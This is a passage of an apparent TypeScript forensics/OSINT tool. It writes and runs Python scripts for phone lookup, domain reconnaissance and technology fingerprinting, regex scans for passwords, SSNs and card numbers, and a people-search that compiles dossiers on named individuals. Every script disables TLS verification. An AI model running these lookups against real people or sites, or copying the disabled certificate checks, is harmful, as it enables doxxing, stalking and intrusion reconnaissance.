    '213': 'California', '214': 'Texas', '215': 'Pennsylvania', '216': 'Ohio',
    '217': 'Illinois', '218': 'Minnesota', '219': 'Indiana', '224': 'Illinois',
    '225': 'Louisiana', '228': 'Mississippi', '229': 'Georgia', '231': 'Michigan',
    '234': 'Ohio', '239': 'Florida', '240': 'Maryland', '248': 'Michigan',
    '251': 'Alabama', '252': 'North Carolina', '253': 'Washington', '254': 'Texas',
    '256': 'Alabama', '260': 'Indiana', '262': 'Wisconsin', '267': 'Pennsylvania',
    '269': 'Michigan', '270': 'Kentucky', '276': 'Virginia', '281': 'Texas',
    '301': 'Maryland', '302': 'Delaware', '303': 'Colorado', '304': 'West Virginia',
    '305': 'Florida', '307': 'Wyoming', '308': 'Nebraska', '309': 'Illinois',
    '310': 'California', '312': 'Illinois', '313': 'Michigan', '314': 'Missouri',
    '315': 'New York', '316': 'Kansas', '317': 'Indiana', '318': 'Louisiana',
    '319': 'Iowa', '320': 'Minnesota', '321': 'Florida', '323': 'California',
    '330': 'Ohio', '331': 'Illinois', '334': 'Alabama', '336': 'North Carolina',
    '337': 'Louisiana', '339': 'Massachusetts', '340': 'US Virgin Islands',
    '347': 'New York', '351': 'Massachusetts', '352': 'Florida', '360': 'Washington',
    '361': 'Texas', '385': 'Utah', '386': 'Florida', '401': 'Rhode Island',
    '402': 'Nebraska', '404': 'Georgia', '405': 'Oklahoma', '406': 'Montana',
    '407': 'Florida', '408': 'California', '409': 'Texas', '410': 'Maryland',
    '412': 'Pennsylvania', '413': 'Massachusetts', '414': 'Wisconsin',
    '415': 'California', '417': 'Missouri', '419': 'Ohio', '423': 'Tennessee',
    '424': 'California', '425': 'Washington', '430': 'Texas', '432': 'Texas',
    '434': 'Virginia', '435': 'Utah', '440': 'Ohio', '442': 'California',
    '443': 'Maryland', '469': 'Texas', '470': 'Georgia', '475': 'Connecticut',
    '478': 'Georgia', '479': 'Arkansas', '480': 'Arizona', '484': 'Pennsylvania',
    '501': 'Arkansas', '502': 'Kentucky', '503': 'Oregon', '504': 'Louisiana',
    '505': 'New Mexico', '507': 'Minnesota', '508': 'Massachusetts', '509': 'Washington',
    '510': 'California', '512': 'Texas', '513': 'Ohio', '515': 'Iowa',
    '516': 'New York', '517': 'Michigan', '518': 'New York', '520': 'Arizona',
    '530': 'California', '531': 'Nebraska', '534': 'Wisconsin', '539': 'Oklahoma',
    '540': 'Virginia', '541': 'Oregon', '551': 'New Jersey', '559': 'California',
    '561': 'Florida', '562': 'California', '563': 'Iowa', '567': 'Ohio',
    '570': 'Pennsylvania', '571': 'Virginia', '573': 'Missouri', '574': 'Indiana',
    '580': 'Oklahoma', '585': 'New York', '586': 'Michigan', '601': 'Mississippi',
    '602': 'Arizona', '603': 'New Hampshire', '605': 'South Dakota', '606': 'Kentucky',
    '607': 'New York', '608': 'Wisconsin', '609': 'New Jersey', '610': 'Pennsylvania',
    '612': 'Minnesota', '614': 'Ohio', '615': 'Tennessee', '616': 'Michigan',
    '617': 'Massachusetts', '618': 'Illinois', '619': 'California', '620': 'Kansas',
    '623': 'Arizona', '626': 'California', '630': 'Illinois', '631': 'New York',
    '636': 'Missouri', '641': 'Iowa', '646': 'New York', '650': 'California',
    '651': 'Minnesota', '657': 'California', '660': 'Missouri', '661': 'California',
    '662': 'Mississippi', '667': 'Maryland', '669': 'California', '678': 'Georgia',
    '681': 'West Virginia', '682': 'Texas', '701': 'North Dakota', '702': 'Nevada',
    '703': 'Virginia', '704': 'North Carolina', '706': 'Georgia', '707': 'California',
    '708': 'Illinois', '712': 'Iowa', '713': 'Texas', '714': 'California',
    '715': 'Wisconsin', '716': 'New York', '717': 'Pennsylvania', '718': 'New York',
    '719': 'Colorado', '720': 'Colorado', '724': 'Pennsylvania', '725': 'Nevada',
    '727': 'Florida', '731': 'Tennessee', '732': 'New Jersey', '734': 'Michigan',
    '737': 'Texas', '740': 'Ohio', '747': 'California', '754': 'Florida',
    '757': 'Virginia', '760': 'California', '762': 'Georgia', '763': 'Minnesota',
    '765': 'Indiana', '769': 'Mississippi', '770': 'Georgia', '772': 'Florida',
    '773': 'Illinois', '774': 'Massachusetts', '775': 'Nevada', '779': 'Illinois',
    '781': 'Massachusetts', '785': 'Kansas', '786': 'Florida', '801': 'Utah',
    '802': 'Vermont', '803': 'South Carolina', '804': 'Virginia', '805': 'California',
    '806': 'Texas', '808': 'Hawaii', '810': 'Michigan', '812': 'Indiana',
    '813': 'Florida', '814': 'Pennsylvania', '815': 'Illinois', '816': 'Missouri',
    '817': 'Texas', '818': 'California', '828': 'North Carolina', '830': 'Texas',
    '831': 'California', '832': 'Texas', '843': 'South Carolina', '845': 'New York',
    '847': 'Illinois', '848': 'New Jersey', '850': 'Florida', '856': 'New Jersey',
    '857': 'Massachusetts', '858': 'California', '859': 'Kentucky', '860': 'Connecticut',
    '862': 'New Jersey', '863': 'Florida', '864': 'South Carolina', '865': 'Tennessee',
    '870': 'Arkansas', '872': 'Illinois', '878': 'Pennsylvania', '901': 'Tennessee',
    '903': 'Texas', '904': 'Florida', '906': 'Michigan', '907': 'Alaska',
    '908': 'New Jersey', '909': 'California', '910': 'North Carolina', '912': 'Georgia',
    '913': 'Kansas', '914': 'New York', '915': 'Texas', '916': 'California',
    '917': 'New York', '918': 'Oklahoma', '919': 'North Carolina', '920': 'Wisconsin',
    '925': 'California', '928': 'Arizona', '929': 'New York', '931': 'Tennessee',
    '936': 'Texas', '937': 'Ohio', '938': 'Alabama', '940': 'Texas',
    '941': 'Florida', '947': 'Michigan', '949': 'California', '951': 'California',
    '952': 'Minnesota', '954': 'Florida', '956': 'Texas', '959': 'Connecticut',
    '970': 'Colorado', '971': 'Oregon', '972': 'Texas', '973': 'New Jersey',
    '978': 'Massachusetts', '979': 'Texas', '980': 'North Carolina', '985': 'Louisiana',
}

ac = results['analysis'].get('area_code', '')
if ac in US_AREA_CODES:
    results['analysis']['region'] = US_AREA_CODES[ac]

# Number type heuristics
results['analysis']['is_valid_length'] = len(digits.lstrip('+')) >= 7
results['analysis']['is_toll_free'] = ac in ['800', '888', '877', '866', '855', '844', '833']
results['analysis']['is_premium'] = ac in ['900', '976']

json.dump(results, open(output, 'w'), indent=2, default=str)
analysis = results['analysis']
print(json.dumps({'country': analysis.get('country','Unknown'), 'region': analysis.get('region',''), 'format': analysis.get('format',''), 'valid': analysis.get('is_valid_length', False)}))
`;
            const scriptPath = path.join(outputPath, '_phone_lookup.py');
            const resultPath = path.join(outputPath, 'phone_lookup_results.json');
            await fs.writeFile(scriptPath, phoneScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, targetIdentifier, resultPath], { timeout: 30000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Phone number analysis complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          case 'domain-whois': {
            if (!targetIdentifier) throw new Error('Target identifier required for domain/IP intelligence');
            if (!python.found) throw new Error('Python required');
            progress(progressCh, 10, `Gathering domain/IP intelligence for: ${targetIdentifier}...`);

            const domainScript = `
import socket, json, sys, ssl, re
import urllib.request
from urllib.parse import quote

target = sys.argv[1]
output = sys.argv[2]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

results = {'target': target, 'dns': {}, 'http': {}, 'ssl_info': {}}

# Determine if IP or domain
is_ip = bool(re.match(r'^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$', target))
domain = target

# DNS resolution
if not is_ip:
    try:
        ips = socket.getaddrinfo(domain, None)
        results['dns']['a_records'] = list(set([ip[4][0] for ip in ips if ip[0] == socket.AF_INET]))
        results['dns']['aaaa_records'] = list(set([ip[4][0] for ip in ips if ip[0] == socket.AF_INET6]))
    except Exception as e:
        results['dns']['error'] = str(e)

    # MX records via port 25 check
    try:
        mx_info = socket.getaddrinfo(domain, 25, socket.AF_INET, socket.SOCK_STREAM)
        results['dns']['has_mx'] = len(mx_info) > 0
        results['dns']['mx_ips'] = list(set([m[4][0] for m in mx_info]))
    except:
        results['dns']['has_mx'] = False

    # NS check (common nameserver subdomains)
    for ns_prefix in ['ns1', 'ns2', 'dns1', 'dns2']:
        try:
            ns_host = f'{ns_prefix}.{domain}'
            ns_ips = socket.getaddrinfo(ns_host, None)
            if 'nameservers' not in results['dns']:
                results['dns']['nameservers'] = []
            results['dns']['nameservers'].append({'host': ns_host, 'ip': ns_ips[0][4][0]})
        except:
            pass
else:
    # Reverse DNS for IP
    try:
        hostname = socket.gethostbyaddr(target)
        results['dns']['reverse_dns'] = hostname[0]
        results['dns']['aliases'] = hostname[1]
    except Exception as e:
        results['dns']['reverse_dns_error'] = str(e)

# HTTP inspection (no credentials needed)
for proto in ['https', 'http']:
    try:
        url = f'{proto}://{domain}'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        body = resp.read().decode('utf-8', errors='ignore')[:5000]
        results['http']['status'] = resp.status
        results['http']['server'] = resp.headers.get('Server', '')
        results['http']['powered_by'] = resp.headers.get('X-Powered-By', '')
        results['http']['content_type'] = resp.headers.get('Content-Type', '')
        results['http']['all_headers'] = dict(resp.headers)

        # Technology detection
        techs = []
        if 'wp-content' in body or 'wp-includes' in body: techs.append('WordPress')
        if 'drupal' in body.lower(): techs.append('Drupal')
        if 'joomla' in body.lower(): techs.append('Joomla')
        if '__NEXT_DATA__' in body or 'next/static' in body: techs.append('Next.js')
        if '_nuxt' in body: techs.append('Nuxt.js')
        if 'react' in body.lower(): techs.append('React')
        if 'angular' in body.lower(): techs.append('Angular')
        if 'laravel' in body.lower(): techs.append('Laravel')
        if 'django' in body.lower(): techs.append('Django')
        if 'shopify' in body.lower(): techs.append('Shopify')
        if 'cloudflare' in str(resp.headers).lower(): techs.append('Cloudflare')
        results['http']['technologies'] = techs

        # Extract title
        title_match = re.search(r'<title[^>]*>(.*?)</title>', body, re.IGNORECASE | re.DOTALL)
        if title_match:
            results['http']['title'] = title_match.group(1).strip()[:200]

        # Check common paths
        common = ['/robots.txt', '/sitemap.xml', '/.well-known/security.txt']
        results['http']['paths'] = {}
        for p in common:
            try:
                preq = urllib.request.Request(f'{url}{p}', headers={'User-Agent': 'Mozilla/5.0'})
                presp = urllib.request.urlopen(preq, timeout=5, context=ctx)
                pcontent = presp.read().decode('utf-8', errors='ignore')[:2000]
                results['http']['paths'][p] = {'status': presp.status, 'preview': pcontent[:500]}
            except urllib.error.HTTPError as e:
                results['http']['paths'][p] = {'status': e.code}
            except:
                pass
        break
    except Exception as e:
        results['http'][f'{proto}_error'] = str(e)

# SSL certificate info (no credentials needed)
if not is_ip:
    try:
        import ssl as ssl_mod
        conn_ctx = ssl_mod.create_default_context()
        with socket.create_connection((domain, 443), timeout=10) as sock:
            with conn_ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                results['ssl_info'] = {
                    'subject': dict(x[0] for x in cert.get('subject', [])),
                    'issuer': dict(x[0] for x in cert.get('issuer', [])),
                    'valid_from': cert.get('notBefore', ''),
                    'valid_until': cert.get('notAfter', ''),
                    'serial_number': cert.get('serialNumber', ''),
                    'san': [entry[1] for entry in cert.get('subjectAltName', [])],
                    'version': cert.get('version', ''),
                }
    except Exception as e:
        results['ssl_info']['error'] = str(e)

json.dump(results, open(output, 'w'), indent=2, default=str)
dns_count = len(results['dns'].get('a_records', []))
print(json.dumps({'dns_records': dns_count, 'server': results['http'].get('server',''), 'technologies': results['http'].get('technologies',[]), 'has_ssl': bool(results['ssl_info'].get('subject'))}))
`;
            const scriptPath = path.join(outputPath, '_domain_whois.py');
            const resultPath = path.join(outputPath, 'domain_intel_results.json');
            await fs.writeFile(scriptPath, domainScript, 'utf-8');
            const result = await runCommand(python.path, [scriptPath, targetIdentifier, resultPath], { timeout: 60000 });
            await fs.unlink(scriptPath).catch(() => {});
            progress(progressCh, 100, 'Domain/IP intelligence complete');
            return { success: true, outputPath: resultPath, summary: result.stdout.trim() };
          }

          default: {
            if (source === 'breach-check') {
              // Breach-check: comprehensive OSINT + local scan combined approach
              if (!targetIdentifier) throw new Error('Target identifier required for breach check');
              if (!python.found) throw new Error('Python required for breach check');

              progress(progressCh, 10, `Running breach check for: ${targetIdentifier}...`);

              const breachScript = `
import urllib.request, json, sys, ssl, re, os
from urllib.parse import quote

target = sys.argv[1]
output_dir = sys.argv[2]
patterns_str = sys.argv[3]
deep_scan = sys.argv[4] == 'true'
cross_ref = sys.argv[5] == 'true'
patterns = patterns_str.split(',')

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

results = {
    'target': target,
    'scan_type': 'breach-check',
    'deep_scan': deep_scan,
    'patterns_requested': patterns,
    'osint_findings': {},
    'breach_indicators': [],
    'cross_references': [],
}

# --- OSINT Phase ---
# GitHub search for target
try:
    url = f'https://api.github.com/search/users?q={quote(target)}'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    profiles = []
    for item in data.get('items', [])[:10]:
        try:
            detail_req = urllib.request.Request(item['url'], headers={'User-Agent': 'RMPG-Forensics/1.0'})
            detail_resp = urllib.request.urlopen(detail_req, timeout=10, context=ctx)
            detail = json.loads(detail_resp.read())
            profile = {
                'source': 'github',
                'username': detail.get('login', ''),
                'name': detail.get('name', ''),
                'email': detail.get('email', ''),
                'company': detail.get('company', ''),
                'location': detail.get('location', ''),
                'bio': detail.get('bio', ''),
                'avatar_url': detail.get('avatar_url', ''),
                'profile_url': detail.get('html_url', ''),
                'created': detail.get('created_at', ''),
                'repos': detail.get('public_repos', 0),
            }
            profiles.append(profile)

            # Deep scan: check repos for leaked secrets
            if deep_scan and 'email' in patterns:
                try:
                    repos_req = urllib.request.Request(
                        f'{item["url"]}/repos?per_page=5&sort=updated',
                        headers={'User-Agent': 'RMPG-Forensics/1.0'}
                    )
                    repos_resp = urllib.request.urlopen(repos_req, timeout=10, context=ctx)
                    repos = json.loads(repos_resp.read())
                    for repo in repos:
                        if repo.get('description'):
                            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', repo['description'])
                            for e in emails:
                                results['breach_indicators'].append({
                                    'type': 'email',
                                    'value': e,
                                    'source': f'github_repo:{repo["full_name"]}',
                                    'confidence': 'medium',
                                })
                except: pass
        except: pass
    results['osint_findings']['github'] = profiles
except Exception as e:
    results['osint_findings']['github_error'] = str(e)

# Reddit search
try:
    url = f'https://www.reddit.com/search.json?q={quote(target)}&limit=5'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG-Forensics/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    reddit_hits = []
    for child in data.get('data', {}).get('children', []):
        post = child.get('data', {})
        reddit_hits.append({
            'title': post.get('title', ''),
            'subreddit': post.get('subreddit', ''),
            'author': post.get('author', ''),
            'url': f'https://reddit.com{post.get("permalink", "")}',
        })
    results['osint_findings']['reddit'] = reddit_hits
except Exception as e:
    results['osint_findings']['reddit_error'] = str(e)

# --- Scan existing local files if output_dir has content ---
REGEX_MAP = {
    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',
    'credit-card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b',
    'email': r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b',
    'phone': r'\\b(?:\\+?1?[-.]?)?\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}\\b',
    'ip-address': r'\\b(?:(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\b',
    'dob': r'\\b(?:0[1-9]|1[0-2])[/\\-](?:0[1-9]|[12]\\d|3[01])[/\\-](?:19|20)\\d{2}\\b',
    'bank-account': r'\\b\\d{8,17}\\b',
    'passport': r'\\b[A-Z]{1,2}\\d{6,9}\\b',
    'drivers-license': r'\\b[A-Z]{1,2}\\d{5,8}\\b',
    'username': r'(?:username|user|login|account)[\\s:=]+["\\'\\s]*([A-Za-z0-9._@-]{3,30})',
    'password': r'(?:password|passwd|pass|pwd|secret)[\\s:=]+["\\'\\s]*([^\\s"\\',;]{4,50})',
    'medical': r'(?:MRN|medical.record|patient.id|diagnosis|ICD[-]?\\d{1,2})[\\s:=]+["\\'\\s]*([^\\s"\\',;]+)',
    'biometric': r'(?:fingerprint|face.id|iris|retina|biometric)[\\s:=]+["\\'\\s]*([^\\s"\\',;]+)',
    'address': r'\\b\\d{1,5}\\s+[A-Z][a-z]+\\s+(?:St|Ave|Blvd|Dr|Rd|Ln|Way|Ct|Pl|Cir|Pkwy|Terr?)\\b',
}
local_findings = []
if os.path.isdir(output_dir):
    for root, dirs, files in os.walk(output_dir):
        for fname in files:
            if fname.startswith('_') or fname.endswith('.py'):
                continue
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, 'r', errors='ignore') as f:
                    content = f.read(2000000)
                for ptype in patterns:
                    if ptype in REGEX_MAP:
                        matches = re.findall(REGEX_MAP[ptype], content)
                        if matches:
                            local_findings.append({
                                'file': os.path.relpath(fpath, output_dir),
                                'type': ptype,
                                'count': len(matches),
                                'samples': matches[:10],
                            })
            except: pass
results['local_scan'] = local_findings

# --- Cross-reference ---
if cross_ref:
    all_emails = set()
    all_usernames = set()
    for profile in results['osint_findings'].get('github', []):
        if profile.get('email'): all_emails.add(profile['email'])
        if profile.get('username'): all_usernames.add(profile['username'])
    for finding in local_findings:
        if finding['type'] == 'email':
            all_emails.update(finding['samples'])
        if finding['type'] == 'username':
            all_usernames.update(finding['samples'])
    for ind in results.get('breach_indicators', []):
        if ind['type'] == 'email':
            all_emails.add(ind['value'])
    results['cross_references'] = {
        'unique_emails': sorted(all_emails),
        'unique_usernames': sorted(all_usernames),
        'email_username_overlap': sorted(all_emails & all_usernames),
    }

# Summary
summary = {
    'osint_sources_checked': len(results['osint_findings']),
    'breach_indicators': len(results['breach_indicators']),
    'local_findings': len(local_findings),
    'patterns_scanned': len(patterns),
}

os.makedirs(output_dir, exist_ok=True)
output_file = os.path.join(output_dir, 'breach_check_results.json')
json.dump(results, open(output_file, 'w'), indent=2, default=str)
print(json.dumps(summary))
`;
              const scriptPath = path.join(outputPath, '_breach_check.py');
              await fs.writeFile(scriptPath, breachScript, 'utf-8');
              const result = await runCommand(python.path, [
                scriptPath, targetIdentifier, outputPath, patterns.join(','),
                deepScan ? 'true' : 'false',
                options.crossReference ? 'true' : 'false',
              ], { timeout: 180000 });
              await fs.unlink(scriptPath).catch(() => {});
              progress(progressCh, 100, 'Breach check complete');
              return {
                success: true,
                outputPath: path.join(outputPath, 'breach_check_results.json'),
                summary: result.stdout.trim(),
              };
            }

            progress(progressCh, 50, `Source "${source}" processing...`);
            await writeJson(path.join(outputPath, 'pii_config.json'), options);
            progress(progressCh, 100, 'Configuration saved');
            return { success: true, message: `PII polling for "${source}" configured` };
          }
        }
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );

  ipcMain.handle(IPC_CHANNELS.PII_SCAN, async () => {
    return { success: true, message: 'Use PII_POLL with specific source type' };
  });
}

// ---------------------------------------------------------------------------
// Helper: Parse ls -la output into file entries
// ---------------------------------------------------------------------------

function parseLsOutput(output: string, basePath: string): Array<{
  name: string;
  path: string;
  type: 'file' | 'directory';
  size?: number;
  permissions?: string;
  modified?: string;
}> {
  const lines = output.trim().split(/\r?\n/).filter((l) => l.trim() && !l.startsWith('total'));
  return lines.map((line) => {
    const parts = line.trim().split(/\s+/);
    if (parts.length < 7) return null;
    const permissions = parts[0];
    const size = parseInt(parts[4], 10) || 0;
    const dateStr = `${parts[5]} ${parts[6]}`;
    const name = parts.slice(7).join(' ');
    if (!name || name === '.' || name === '..') return null;
    const type: 'file' | 'directory' = permissions.startsWith('d') ? 'directory' : 'file';
    return {
      name,
      path: `${basePath.replace(/\/$/, '')}/${name}`,
      type,
      size: type === 'file' ? size : undefined,
      permissions,
      modified: dateStr,
    };
  }).filter(Boolean) as any[];
}

// ---------------------------------------------------------------------------
// Helper: Parse logcat output
// ---------------------------------------------------------------------------

function parseLogcatOutput(output: string): Array<{ timestamp: string; level: string; tag: string; message: string }> {
  const lines = output.trim().split(/\r?\n/);
  return lines.map((line) => {
    // Format: MM-DD HH:MM:SS.mmm PID TID LEVEL TAG: message
    const match = line.match(/^(\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}\.\d+)\s+\d+\s+\d+\s+([VDIWEF])\s+(.+?):\s*(.*)$/);
    if (match) {
      return { timestamp: match[1], level: match[2], tag: match[3], message: match[4] };
    }
    return { timestamp: '', level: 'I', tag: '', message: line };
  }).filter((e) => e.message);
}

// ---------------------------------------------------------------------------
// People Search Handler
// ---------------------------------------------------------------------------

function registerPeopleSearchHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.PEOPLE_SEARCH,
    async (_event, options: {
      subject: {
        firstName?: string;
        lastName?: string;
        email?: string;
        phone?: string;
        address?: string;
        dob?: string;
        ssn?: string;
        username?: string;
      };
      requestedData: string[];
      source: string;
      outputPath: string;
      deepSearch?: boolean;
      crossReference?: boolean;
    }) => {
      const { subject, requestedData, source, outputPath, deepSearch, crossReference } = options;
      const progressCh = IPC_CHANNELS.PEOPLE_SEARCH_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, 'Starting people search...');

      const python = await resolveTool('python');
      if (!python.found) throw new Error('Python is required for people search operations');

      try {
        const dossier: Record<string, unknown> = {
          subject,
          searchTimestamp: new Date().toISOString(),
          requestedData,
          source,
          findings: {} as Record<string, unknown>,
        };

        const totalSteps = requestedData.length;
        let completed = 0;

        for (const dataPoint of requestedData) {
          completed++;
          const pct = Math.round((completed / totalSteps) * 85) + 10;
          progress(progressCh, pct, `Searching: ${dataPoint}...`);

          switch (dataPoint) {
            case 'email': {
              // Search for email addresses associated with the subject
              if (subject.email) {
                (dossier.findings as Record<string, unknown>)['email'] = {
                  known: [subject.email],
                  status: 'confirmed',
                };
              }
              // OSINT email enumeration
              if (subject.firstName && subject.lastName) {
                const searchScript = `
import json, sys, urllib.request, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
first, last, output = sys.argv[1], sys.argv[2], sys.argv[3]
# Generate likely email patterns
domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com']
patterns = [
    f'{first}.{last}', f'{first}{last}', f'{first[0]}{last}',
    f'{last}{first[0]}', f'{first}_{last}', f'{last}.{first}'
]
candidates = [f'{p.lower()}@{d}' for p in patterns for d in domains]
# Check GitHub for matching users
found = []
try:
    url = f'https://api.github.com/search/users?q={first}+{last}'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    for item in data.get('items', [])[:5]:
        found.append({'source': 'github', 'username': item['login'], 'profile': item['html_url']})
except: pass
result = {'candidates': candidates[:20], 'verified': found}
json.dump(result, open(output, 'w'), indent=2)
print(json.dumps({'candidates': len(candidates), 'verified': len(found)}))
`;
                const scriptPath = path.join(outputPath, '_email_enum.py');
                const resultPath = path.join(outputPath, 'email_results.json');
                await fs.writeFile(scriptPath, searchScript, 'utf-8');
                const result = await runCommand(python.path, [scriptPath, subject.firstName, subject.lastName, resultPath], { timeout: 30000 });
                await fs.unlink(scriptPath).catch(() => {});
                try {
                  const emailData = JSON.parse(await fs.readFile(resultPath, 'utf-8'));
                  (dossier.findings as Record<string, unknown>)['email'] = emailData;
                } catch { /* skip */ }
              }
              break;
            }

            case 'social-media': {
              // Search social media for the subject
              const username = subject.username || `${subject.firstName}${subject.lastName}`.toLowerCase();
              const platforms = [
                { name: 'GitHub', url: `https://api.github.com/users/${username}` },
                { name: 'Twitter/X', url: `https://api.twitter.com/2/users/by/username/${username}` },
              ];
              const socialResults: Array<{ platform: string; found: boolean; url?: string; data?: unknown }> = [];

              for (const platform of platforms) {
                try {
                  const result = await runCommand(python.path, ['-c', `
import urllib.request, json, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    req = urllib.request.Request("${platform.url}", headers={"User-Agent": "RMPG/1.0"})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    print(json.dumps({"found": True, "data": data}))
except Exception as e:
    print(json.dumps({"found": False, "error": str(e)}))
`], { timeout: 15000 });
                  const parsed = JSON.parse(result.stdout.trim());
                  socialResults.push({ platform: platform.name, ...parsed });
                } catch {
                  socialResults.push({ platform: platform.name, found: false });
                }
              }
              (dossier.findings as Record<string, unknown>)['social-media'] = socialResults;
              break;
            }

            case 'phone': {
              if (subject.phone) {
                (dossier.findings as Record<string, unknown>)['phone'] = {
                  known: [subject.phone],
                  status: 'provided_by_investigator',
                };
              }
              break;
            }

            case 'address': {
              if (subject.address) {
                (dossier.findings as Record<string, unknown>)['address'] = {
                  known: [subject.address],
                  status: 'provided_by_investigator',
                };
              }
              break;
            }

            case 'ssn': {
              if (subject.ssn) {
                (dossier.findings as Record<string, unknown>)['ssn'] = {
                  known: subject.ssn,
                  status: 'provided_by_investigator',
                  note: 'SSN verification requires authorized database access',
                };
              } else {
                (dossier.findings as Record<string, unknown>)['ssn'] = {
                  status: 'requires_authorized_database',
                  note: 'SSN lookup requires connection to authorized records system',
                };
              }
              break;
            }

            case 'dob': {
              if (subject.dob) {
                (dossier.findings as Record<string, unknown>)['dob'] = {
                  known: subject.dob,
                  status: 'provided_by_investigator',
                };
              }
              break;
            }

            case 'usernames': {
              // Check username across platforms
              const handle = subject.username || `${subject.firstName || ''}${subject.lastName || ''}`.toLowerCase();
              if (handle) {
                const checkScript = `
import urllib.request, json, sys, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
username = sys.argv[1]
output = sys.argv[2]
sites = [
    {'name': 'GitHub', 'url': f'https://github.com/{username}', 'check': 200},
    {'name': 'Reddit', 'url': f'https://www.reddit.com/user/{username}/about.json', 'check': 200},
]
results = []
for site in sites:
    try:
        req = urllib.request.Request(site['url'], headers={'User-Agent': 'Mozilla/5.0'})
        resp = urllib.request.urlopen(req, timeout=8, context=ctx)
        results.append({'site': site['name'], 'exists': True, 'url': site['url']})
    except urllib.error.HTTPError as e:
        results.append({'site': site['name'], 'exists': e.code != 404, 'status': e.code})
    except:
        results.append({'site': site['name'], 'exists': False, 'error': 'timeout'})
json.dump(results, open(output, 'w'), indent=2)
print(json.dumps({'checked': len(sites), 'found': len([r for r in results if r.get('exists')])}))
`;
                const scriptPath = path.join(outputPath, '_username_check.py');
                const resultPath = path.join(outputPath, 'username_results.json');
                await fs.writeFile(scriptPath, checkScript, 'utf-8');
                const result = await runCommand(python.path, [scriptPath, handle, resultPath], { timeout: 60000 });
                await fs.unlink(scriptPath).catch(() => {});
                try {
                  (dossier.findings as Record<string, unknown>)['usernames'] = JSON.parse(await fs.readFile(resultPath, 'utf-8'));
                } catch { /* skip */ }
              }
              break;
            }

            case 'employment': {
              // Employment history lookup via web OSINT
              const empUsername = subject.username || `${subject.firstName || ''}${subject.lastName || ''}`.toLowerCase();
              if (empUsername) {
                const empScript = `
import urllib.request, json, sys, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
name = sys.argv[1]
output = sys.argv[2]
results = []
# Check GitHub for company/bio info
try:
    url = f'https://api.github.com/search/users?q={name}+type:user'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG/1.0'})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    data = json.loads(resp.read())
    for item in data.get('items', [])[:5]:
        try:
            detail_req = urllib.request.Request(item['url'], headers={'User-Agent': 'RMPG/1.0'})
            detail_resp = urllib.request.urlopen(detail_req, timeout=10, context=ctx)
            detail = json.loads(detail_resp.read())
            if detail.get('company') or detail.get('bio'):
                results.append({
                    'source': 'github',
                    'username': detail['login'],
                    'company': detail.get('company', ''),
                    'bio': detail.get('bio', ''),
                    'location': detail.get('location', ''),
                })
        except: pass
except: pass
json.dump({'results': results, 'source': 'osint'}, open(output, 'w'), indent=2)
print(json.dumps({'found': len(results)}))
`;
                const scriptPath = path.join(outputPath, '_employment.py');
                const resultPath = path.join(outputPath, 'employment_results.json');
                await fs.writeFile(scriptPath, empScript, 'utf-8');
                await runCommand(python.path, [scriptPath, empUsername, resultPath], { timeout: 30000 });
                await fs.unlink(scriptPath).catch(() => {});
                try {
                  (dossier.findings as Record<string, unknown>)['employment'] = JSON.parse(await fs.readFile(resultPath, 'utf-8'));
                } catch { /* skip */ }
              } else {
                (dossier.findings as Record<string, unknown>)['employment'] = {
                  status: 'insufficient_input',
                  note: 'Name or username required for employment search',
                };
              }
              break;
            }

            case 'relatives': {
              // Relatives/associates lookup
              if (subject.firstName && subject.lastName) {
                const relScript = `
import urllib.request, json, sys, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
first, last, output = sys.argv[1], sys.argv[2], sys.argv[3]
results = {'query': f'{first} {last}', 'associates': [], 'source': 'osint'}
try:
    url = f'https://api.github.com/search/users?q={first}+{last}'
    req = urllib.request.Request(url, headers={'User-Agent': 'RMPG/1.0'})
